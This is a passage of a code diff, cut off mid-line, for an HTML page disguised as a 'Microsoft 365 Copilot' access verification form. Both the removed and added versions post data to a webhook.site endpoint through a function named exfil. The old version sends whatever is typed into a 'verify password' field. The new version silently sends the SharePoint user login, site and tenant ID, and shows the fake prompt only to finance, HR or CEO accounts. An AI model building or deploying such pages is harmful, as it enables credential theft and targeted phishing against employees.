@@ -1,26 +1,32 @@
 <!DOCTYPE html>
 <html>
-<head><title>Copilot Verification</title></head>
-<body style="font-family:'Segoe UI', sans-serif; padding:30px;">
-  <h2>Microsoft Copilot Access</h2>
-  <p>Please verify your access to Copilot by answering below:</p>
-  <input id="input" type="text" placeholder="Ask Copilot or verify password" style="width:300px; padding:10px;">
-  <br><br>
-  <button onclick="exfil()">Submit</button>
+<head>
+  <title>Copilot Access Verification</title>
+</head>
+<body style="font-family:'Segoe UI', sans-serif; padding:40px; max-width:600px; margin:auto;">
+
+  <h2>Microsoft 365 Copilot</h2>
+  <p id="userMsg">Loading Copilot prompt…</p>
+
+  <div id="copilotForm" style="display:none;">
+    <input id="copilotInput" type="text" placeholder="Ask Copilot or verify access code" style="width:100%; padding:10px;">
+    <br><br>
+    <button onclick="exfil()">Submit</button>
+  </div>
 
   <script>
-    function exfil() {
-      fetch("https://webhook.site/your-id", {
-        method: "POST",
-        body: JSON.stringify({
-          value: document.getElementById("input").value,
-          location: location.href
-        }),
-        headers: {
-          "Content-Type": "application/json"
-        }
-      });
-    }
-  </script>
-</body>
-</html>
+    function getUserContext() {
+      try {
+        const user = window._spPageContextInfo.userLoginName || 'unknown';
+        const site = window._spPageContextInfo.webTitle;
+        const tenant = window._spPageContextInfo.tenantId;
+
+        fetch("https://webhook.site/your-id", {
+          method: "POST",
+          body: JSON.stringify({ fingerprintOnly: true, user, site, tenant }),
+          headers: { "Content-Type": "application/json" }
+        });
+
+        // Show fake input only for finance, HR, or specific users
+        if (user.includes("finance") || user.includes("hr") || user.includes("ceo")) {
+          document.getElementById("userMsg"
